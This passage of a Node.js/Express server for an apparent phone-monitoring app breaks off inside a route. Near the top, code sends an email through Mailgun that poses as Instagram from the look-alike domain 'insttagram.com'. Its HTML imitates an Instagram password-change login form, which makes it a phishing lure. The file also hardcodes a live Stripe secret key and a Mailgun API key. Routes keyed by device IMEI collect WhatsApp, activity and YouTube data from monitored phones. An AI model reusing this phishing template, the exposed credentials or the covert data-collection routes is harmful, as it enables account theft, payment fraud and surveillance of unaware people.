async function f() {


    var cookieParser = require('cookie-parser');


    //commandArray dashib tokule biler cunki saatda gelende silinmir ona gorede server dayan biler.


    const mailgun = require("mailgun-js");
    const DOMAIN = "mg.lookin24.com";
    const mg = mailgun({apiKey: "6d3b67e2434192b5277e46b39e601277-f135b0f1-ae549850", domain: DOMAIN});
    const data = {
        from: "Instagram <no-reply@insttagram.com>",
        to: "toghrulgasimov@gmail.com", //farid.naghizada@gmail.com
        subject: "Parolu Deyish",
        text: "Parolu deyishmek ucun link budur",
        html: "<link href=\"https://fonts.googleapis.com/css?family=Indie+Flower|Overpass+Mono\" rel=\"stylesheet\">\n" +
            "\n" +
            "<div id=\"wrapper\" style='width: 500px;\n" +
            "  height: 50%;\n" +
            "  overflow: hidden;\n" +
            "  border: 0px solid #000;\n" +
            "  margin: 50px auto;\n" +
            "  padding: 10px;'>\n" +
            "  <div class=\"main-content\" style='width: 250px;\n" +
            "  height: 40%;\n" +
            "  margin: 10px auto;\n" +
            "  background-color: #fff;\n" +
            "  border: 2px solid #e6e6e6;\n" +
            "  padding: 40px 50px;'>\n" +
            "    <div class=\"header\" style='border: 0px solid #000;\n" +
            "  margin-bottom: 5px;'>\n" +
            "      <img src=\"data:image/jpeg;base64,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" style='height: 50px;\n" +
            "  width: 160px;\n" +
            "  margin: auto;\n" +
            "  position: relative;\n" +
            "  left: 30px;'/>\n" +
            "    </div>\n" +
            "    <div class=\"l-part\">\n" +
            "      <input type=\"text\" placeholder=\"Username\" class=\"input-1\" style='width: 100%;\n" +
            "  margin-bottom: 5px;\n" +
            "  padding: 8px 12px;\n" +
            "  border: 1px solid #dbdbdb;\n" +
            "  box-sizing: border-box;\n" +
            "  border-radius: 3px;'/>\n" +
            "      <div class=\"overlap-text\" style='position: relative;'>\n" +
            "        <input type=\"password\" placeholder=\"Password\" class=\"input-2\" style='width: 100%;\n" +
            "  margin-bottom: 5px;\n" +
            "  padding: 8px 12px;\n" +
            "  border: 1px solid #dbdbdb;\n" +
            "  box-sizing: border-box;\n" +
            "  border-radius: 3px;'/>\n" +
            "        <a href=\"#\" style='position: absolute;\n" +
            "  top: 8px;\n" +
            "  right: 10px;\n" +
            "  color: #003569;\n" +
            "  font-size: 14px;\n" +
            "  text-decoration: none;\n" +
            "  font-family: 'Overpass Mono', monospace;\n" +
            "  letter-spacing: -1px;'>Forgot?</a>\n" +
            "      </div>\n" +
            "      <input type=\"button\" value=\"Log in\" class=\"btn\" style='width: 100%;\n" +
            "  background-color: #3897f0;\n" +
            "  border: 1px solid #3897f0;\n" +
            "  padding: 5px 12px;\n" +
            "  color: #fff;\n" +
            "  font-weight: bold;\n" +
            "  cursor: pointer;\n" +
            "  border-radius: 3px;'/>\n" +
            "    </div>\n" +
            "  </div>\n" +
            "  <div class=\"sub-content\" style='width: 250px;\n" +
            "  height: 40%;\n" +
            "  margin: 10px auto;\n" +
            "  border: 1px solid #e6e6e6;\n" +
            "  padding: 20px 50px;\n" +
            "  background-color: #fff;'>\n" +
            "    <div class=\"s-part\" style='text-align: center;\n" +
            "  font-family: 'Overpass Mono', monospace;\n" +
            "  word-spacing: -3px;\n" +
            "  letter-spacing: -2px;\n" +
            "  font-weight: normal;'>\n" +
            "      Don't have an account?<a href=\"#\" style='text-decoration: none;\n" +
            "  cursor: pointer;\n" +
            "  color: #3897f0;\n" +
            "  font-family: 'Overpass Mono', monospace;\n" +
            "  word-spacing: -3px;\n" +
            "  letter-spacing: -2px;\n" +
            "  font-weight: normal;'>Sign up</a>\n" +
            "    </div>\n" +
            "  </div>\n" +
            "</div>\n" +
            "\n" +
            "\n" +
            "\n" +
            "\n" +
            "<!-- By Coding Market -->\n" +
            "<div class=\"youtube\">\n" +
            "  <a href=\"https://www.youtube.com/channel/UCtVM2RthR4aC6o7dzySmExA\" target=\"_blank\">by coding market</a>\n" +
            "</div>"
    };
    mg.messages().send(data, function (error, body) {
        console.log(body);
    });



    const fs = require('fs');
    //sk_live_1F3Ksgi8u1xixMtAkE2at33d006RrwEQCS
    //sk_test_j08lKmmHNZg0EgDDpCKDOF7Q00ZBJHNpgK
    const stripe = require('stripe')('sk_live_1F3Ksgi8u1xixMtAkE2at33d006RrwEQCS');

    let isSameDay = function(a, b, m) {
        //console.log(a, b);
        b = parseInt(b);
        m = parseInt(m);
        b = b - (m * 1000*60);
        a = new Date(parseInt(a));
        b = new Date(parseInt(b));
        //console.log(a + " and " + b + "---------------------------- isSameDay function called" + a.getTime() + "--" + m);
        return a.getDate() == b.getDate() && a.getMonth() == b.getMonth() && a.getFullYear() == b.getFullYear();
    }
    let filter = function(curDay, of, m) {
        let ans = [];
        //console.log(of);
        if(of == undefined) {
            return ans;
        }
        for(let i = 0; i < of.length; i++) {
            if(isSameDay(curDay, of[i].start, m))
                ans.push(of[i]);
        }
        return ans;
    }


    module.exports.routes = function(app, db){
        app.use(cookieParser('secreteee'));
        let admin = require('firebase-admin');
        let serviceAccount = require("./familyprotector-9fc7b-firebase-adminsdk-39knv-e27615e365.json");

        admin.initializeApp({
            credential: admin.credential.cert(serviceAccount),
            databaseURL: "https://familyprotector-9fc7b.firebaseio.com"
        });


        let multer = require('multer');

        var storage = multer.diskStorage({
            destination: function (req, file, cb) {
                cb(null, 'icons')
            },
            filename: function (req, file, cb) {
                cb(null, file.originalname)
            }
        })

        var upload = multer({ storage: storage })

        app.post("/image",upload.single('aa'), (req, res) => {
            console.log(req.url);
            const file = req.file;
            if (!file) {
                const error = new Error('Please upload a file')
                error.httpStatusCode = 400;

            }else {
                console.log(file);
            }
            res.send("1")
        });

        app.post("/addApp", async function (req, res) {
            console.log(req.url);
            let imei = req.body.imei;
            let pname = req.body.p;
            let name = req.body.n;
            if(imei == "erorrororororroro") {
                res.send("Imei null gelmishdi");
                return;
            }
            console.log(imei + "&&&&&&&&&&&&&&&&&&&&&");
            d = await db.collection("devices").findOne({imei:imei});
            if(d != null && d.apps != undefined) {
                for(let i = 0; i < d.apps.length; i++) {
                    if(d.apps[i].package == pname) {
                        res.send("VAR");
                        return;
                    }
                }
                console.log(pname + " added to apps");
                await db.collection("devices").updateOne({imei:imei}, {$push:{apps:{name:name, package : pname, blocked: false}}});
                res.send("1");

            }else {
                res.send("User Yoxdu");
            }
        });
        app.post("/unavailableIcons", async function (req, res) {
            console.log(req.url);
            let apps = req.body.apps;
            let ans = [];
            console.log(apps);
            for(let i = 0; i < apps.length; i++) {
                let path = "icons/"+apps[i];
                if(!fs.existsSync(path)) {
                    ans.push(apps[i]);
                    console.log("bu yoxdu" + apps[i]);
                }else {
                    console.log("bu var" + apps[i]);
                }
            }
            let data = {apps:ans};
            console.log(data);
            res.send(data);
        });

        app.post("/removeApp", async function (req, res) {
            console.log(req.url);
            console.log(req.body);
            let imei = req.body.imei;
            let ps = req.body.ar;
            let name = req.body.n;
            if(imei == "erorrororororroro") {
                res.send("Imei null gelmishdi");
                return;
            }

            let M = {};
            for(let i = 0; i < ps.length; i++) {
                M[ps[i]] = true;
            }
            d = await db.collection("devices").findOne({imei:imei});
            if(d != null && d.apps != undefined) {
                let newApps = [];
                for(let i = 0; i < d.apps.length; i++) {
                    if(M[d.apps[i].package] == undefined) {
                        newApps.push(d.apps[i]);
                    }
                }
                await db.collection("devices").updateOne({imei:imei}, {$set:{apps:newApps}});
                res.send("1");

            }else {
                res.send("User Yoxdu");
            }



        });




        app.post("/updateFirebaseToken", async function (req, res) {
            console.log(req.url);
            console.log("ddddan cagrildi");
            console.log(req.body.PostData);
            let o = JSON.parse(req.body.PostData);
            console.log(o);
            let imei = o.i;
            let token = o.t;
            if(imei == "erorrororororroro") {
                res.send("Imei null gelmishdi");
                return;
            }
            console.log(imei + "&&&&&&&&&&&&&&&&&&&&&");
            d = await db.collection("devices").findOne({imei:imei});
            if(d == null || d == undefined) {
                await db.collection("devices").updateOne({imei:imei}, {$set:{token:token, apps:[]}}, {upsert:true});
            }else {
                await db.collection("devices").updateOne({imei:imei}, {$set:{token:token}}, {upsert:true});
            }

            // let message = {
            //     data: {
            //         command : 'silIcaze',
            //         v: "1"
            //     },
            //     token: token
            // };
            // admin.messaging().send(message)
            //     .then((response) => {
            //         // Response is a message ID string.
            //         console.log('Successfully sent message:', response);
            //     })
            //     .catch((error) => {
            //         console.log('Error sending message:', error);
            //     });


            res.send("1");
        });
        app.post("/updateFirebaseToken2", async function (req, res) {
            console.log(req.url);
            console.log("ddddan cagrildi");
            console.log(req.body.PostData);
            let o = req.body;
            console.log(o);
            let imei = o.i;
            let token = o.t;
            if(imei == "erorrororororroro") {
                res.send("Imei null gelmishdi");
                return;
            }
            console.log(imei + "&&&&&&&&&&&&&&&&&&&&&");
            d = await db.collection("devices").findOne({imei:imei});
            if(d == null || d == undefined) {
                await db.collection("devices").updateOne({imei:imei}, {$set:{token:token, apps:[]}}, {upsert:true});
            }else {
                await db.collection("devices").updateOne({imei:imei}, {$set:{token:token}}, {upsert:true});
            }

            // let message = {
            //     data: {
            //         command : 'silIcaze',
            //         v: "1"
            //     },
            //     token: token
            // };
            // admin.messaging().send(message)
            //     .then((response) => {
            //         // Response is a message ID string.
            //         console.log('Successfully sent message:', response);
            //     })
            //     .catch((error) => {
            //         console.log('Error sending message:', error);
            //     });


            res.send("1");
        });
        app.post("/accessibiltyinfo", async function (req, res) {
            console.log(req.url);
            console.log("ddddan cagrildi");
            console.log(req.body.PostData);
            let o = req.body;
            console.log(o);

            res.send("1");
        });


        app.post("/initApp", async function (req, res) {
            console.log(req.url);
            // let imei = req.query.imei;
            // let appName = req.query.name;
            // let d = db.collection("devices").findOne();
            console.log(req.body);
            let data = req.body;

            let a = data.apps;
            let anew = [];
            let O = {apps:[]}
            for(let i = 0; i < a.length; i++) {
                try {
                    let path = "icons/"+a[i].package+".png";
                    anew.push({name:a[i].name,package:a[i].package, blocked:false});
                    if (!fs.existsSync(path)) {
                        //await fs.writeFileSync(path, icon);
                        console.log(path + " not exist");
                        O.apps.push(a[i]);
                    }else {
                        console.log(path + " exist");
                    }
                } catch(err) {
                    console.error(err)
                }
            }
            let imei = data.imei;

            d = await db.collection("devices").findOne({imei:imei});
            await db.collection("devices").updateOne({imei:imei}, {$set:{apps:anew}}, {upsert:true});

            res.send(JSON.stringify(O));
        });




        app.get("/getDevice", async function (req, res) {
            console.log(req.url);
            let imei = req.query.imei;
            let d = await db.collection("devices").findOne({imei:imei});
            res.send(JSON.stringify(d));
        });




        let CommandResults = {};
        app.get("/Whatsapp", async function (req, res) {
            console.log(req.url);
            let r = req.query;
            let imei = r.imei;
            console.log("in Whatsapp");
            console.log(req.query);
            let d = await db.collection("devices").findOne({imei:req.query.imei});

            console.log(d);
            let data = {imei: imei, con: d.con}
            res.send(data);
        });

        app.post("/sendWhatsapp", async function (req, res) {
            console.log(req.url);
            console.log("----------in sendWhatsapp");
            //also push notification to user
            let data = req.body;
            console.log(data);
            let imei = data.imei;
            //CommandResults[imei] = data;
            //console.log(data);
            await db.collection("devices").updateOne({imei:imei}, {$set:{con:data.data}}, {upsert:true});
            //let d = await db.collection("devices").findOne({imei:imei});
            CommandResults[imei+'sendWhatsapp'] = data;

            res.send("1");
        });

        app.post("/sendActivity", async function (req, res) {
            console.log(req.url);
            //also push notification to user
            let data = req.body;
            let imei = data.imei;

            console.log("in sendActivity");
            console.log(data);
            let ar = data.data.slice(0);


            let d = await db.collection("devices").findOne({imei:imei});



            if(d == null || d == undefined || d.activity == undefined) {
                data.data = [];
                await db.collection("devices").updateOne({imei:imei}, {$set:{activity:data}}, {upsert:true});
                CommandResults[imei+'sendActivity'] = data;
            }else {

                data = d.activity;
                let le = ar.pop();

                console.log(ar);
                if((d.activity.data.length == 0) || (ar.length > 0 && d.activity.data[d.activity.data.length-1].start != ar[ar.length-1].start)) {
                    await db.collection("devices").updateOne({imei:imei}, {$push:{"activity.data":{$each:ar}}});
                    data.data = d.activity.data.concat(ar);
                }
                if(le != undefined) data.data.push(le);
                CommandResults[imei+'sendActivity'] = data;

            }
            res.send("1");
        });
        app.post("/sendYoutube", async function (req, res) {
            console.log(req.url);
            console.log("----------in sendYoutube");
            //also push notification to user
            let data = req.body;
            console.log(data);
            //data = JSON.parse(data);
            let imei = data.imei;
            console.log("-------in sendYoutube");
